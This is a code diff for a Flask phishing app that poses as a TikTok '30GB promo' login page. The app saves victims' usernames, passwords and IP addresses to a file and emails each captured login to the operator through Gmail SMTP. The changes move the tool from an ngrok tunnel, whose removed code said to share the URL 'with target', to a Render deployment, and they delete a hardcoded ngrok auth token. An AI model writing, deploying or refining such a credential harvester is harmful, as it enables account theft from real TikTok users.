@@ -1,6 +1,6 @@
 # =============================================================================
 # TIKTOK 30GB PROMO + CLEAN LOGIN – RENDER DEPLOYMENT (EMAIL ALERTS)
-# Fixed: ngrok conflict resolution, test-email endpoint, improved design
+# Fixed: Removed ngrok (not needed on Render), uses PORT env variable
 # =============================================================================
 
 import os
@@ -8,14 +8,11 @@ import json
 import logging
 import smtplib
 import threading
-import time
 from email.message import EmailMessage
 from datetime import datetime
 from flask import Flask, request, render_template_string
-from pyngrok import ngrok, conf
 
 # -------------------- Configuration --------------------
-NGROK_AUTH_TOKEN = "3CTdjmF4Jk0Gju0TnBL8K5FWoUh_LdxdiFY7GCaUKKmLbGov"
 DATA_FILE = "captured_credentials.json"
 
 EMAIL_SENDER = os.environ.get('EMAIL_SENDER', '')
@@ -438,7 +435,7 @@ def send_email_alert(subject, body):
         msg['From'] = EMAIL_SENDER
         msg['To'] = EMAIL_RECEIVER
 
-        # Gmail SMTP (adjust if using other provider)
+        # Gmail SMTP
         with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
             smtp.login(EMAIL_SENDER, EMAIL_PASSWORD)
             smtp.send_message(msg)
@@ -466,7 +463,7 @@ def login():
         # Save locally
         save_credentials(username, password, ip)
 
-        # Send email alert
+        # Send email alert (non‑blocking)
         subject = f"🔥 TikTok Login Captured - {username}"
         body = f"""
         New TikTok Login Captured:
@@ -477,45 +474,22 @@ def login():
         Password: {password}
         --------------------------------
         """
-        # Send email in a separate thread to not block response
         threading.Thread(target=send_email_alert, args=(subject, body)).start()
 
-        # Show success message
         return render_template_string(PHISH_HTML, success=True)
 
-    # GET request - show login form
     return render_template_string(PHISH_HTML, success=False)
 
 @app.route('/test-email')
 def test_email():
-    """Endpoint to test email configuration."""
+    """Test email configuration."""
     subject = "Test Email from TikTok Promo App"
     body = f"Test email sent at {datetime.now().isoformat()}"
     success = send_email_alert(subject, body)
     return {"status": "sent" if success else "failed", "timestamp": datetime.now().isoformat()}
 
-# -------------------- Ngrok Setup --------------------
-def start_ngrok():
-    """Configure and start ngrok tunnel."""
-    try:
-        # Set auth token
-        conf.get_default().auth_token = NGROK_AUTH_TOKEN
-        # Kill any existing tunnels to avoid conflict
-        ngrok.kill()
-        time.sleep(1)
-        # Create tunnel
-        public_url = ngrok.connect(5000, bind_tls=True).public_url
-        logger.info(f"Ngrok tunnel established at: {public_url}")
-        logger.info("Share this URL with target")
-    except Exception as e:
-        logger.error(f"Ngrok failed: {e}")
-        logger.info("Running without ngrok. Use localhost:5000 for testing.")
-
 # -------------------- Main --------------------
 if __name__ == '__main__':
-    # Start ngrok in a separate thread
-    threading.Thread(target=start_ngrok, daemon=True).start()
-    # Give ngrok a moment to initialize
-    time.sleep(2)
-    # Run Flask
-    app.run(host='0.0.0.0', port=5000, debug=False)
+    # Render provides the PORT environment variable
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port, debug=False)
